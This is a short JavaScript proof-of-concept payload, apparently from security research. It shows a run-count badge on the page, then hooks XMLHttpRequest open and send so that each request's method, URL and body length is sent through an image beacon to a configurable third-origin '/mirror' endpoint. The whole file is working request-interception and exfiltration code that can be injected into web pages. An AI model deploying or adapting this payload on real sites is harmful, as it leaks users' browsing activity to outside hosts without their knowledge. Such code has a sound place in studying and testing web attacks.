(function () {
  window.__POC_H_PAYLOAD_RUN__ = (window.__POC_H_PAYLOAD_RUN__ || 0) + 1;
  const runNo = window.__POC_H_PAYLOAD_RUN__;
  console.log("[payload] run #" + runNo);

  (function updateBadge() {
    try {
      let b = document.getElementById("pocH_payloadBadge");
      if (!b) {
        b = document.createElement("div");
        b.id = "pocH_payloadBadge";
        b.style.cssText =
          "position:fixed;right:12px;bottom:12px;z-index:2147483647;" +
          "padding:8px 10px;border:1px solid #333;border-radius:10px;" +
          "background:#fff;color:#111;font:12px/1.2 sans-serif;" +
          "box-shadow:0 2px 10px rgba(0,0,0,.15)";
        document.documentElement.appendChild(b);
      }
      b.textContent =
        "payload run #" + runNo + " (XHR hooked: " + (window.__POC_H_XHR_HOOKED__ ? "Y" : "N") + ")";
    } catch (_) {}
  })();

  if (window.__POC_H_XHR_HOOKED__) return;
  window.__POC_H_XHR_HOOKED__ = true;

  const ORIG_OPEN = XMLHttpRequest.prototype.open;
  const ORIG_SEND = XMLHttpRequest.prototype.send;

  function normalizeOrigin(o) {
    return String(o || "").replace(/\/$/, "");
  }

  function normalizeMaybeUpgrade(url) {
    const u = String(url || "");
    if (location.protocol === "https:" && u.startsWith("http://")) {
      return "https://" + u.slice("http://".length);
    }
    return u;
  }

  function getMirrorUrl() {
    try {
      const cfg = window.__POC_H__ || {};
      if (cfg.mirrorUrl) return normalizeMaybeUpgrade(String(cfg.mirrorUrl));
      if (cfg.thirdOrigin) return normalizeMaybeUpgrade(normalizeOrigin(cfg.thirdOrigin) + "/mirror");
    } catch {}

    try {
      const o = window.__POC_H_THIRD_ORIGIN__;
      if (o) return normalizeMaybeUpgrade(normalizeOrigin(o) + "/mirror");
    } catch {}

    return "/__poc_h_mirror_unset";
  }

  function beacon(data) {
    try {
      const qs = encodeURIComponent(JSON.stringify(data));
      const img = new Image();
      img.src = getMirrorUrl() + "?d=" + qs + "&ts=" + Date.now();
    } catch (_) {}
  }

  XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
    this.__poc_method = String(method || "");
    this.__poc_url = String(url || "");
    return ORIG_OPEN.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    beacon({
      type: "XHR_MIRROR",
      method: this.__poc_method,
      url: this.__poc_url,
      bodyLen: body ? String(body).length : 0
    });

    return ORIG_SEND.apply(this, arguments);
  };

  console.log("[payload] XHR prototype hooked");
})();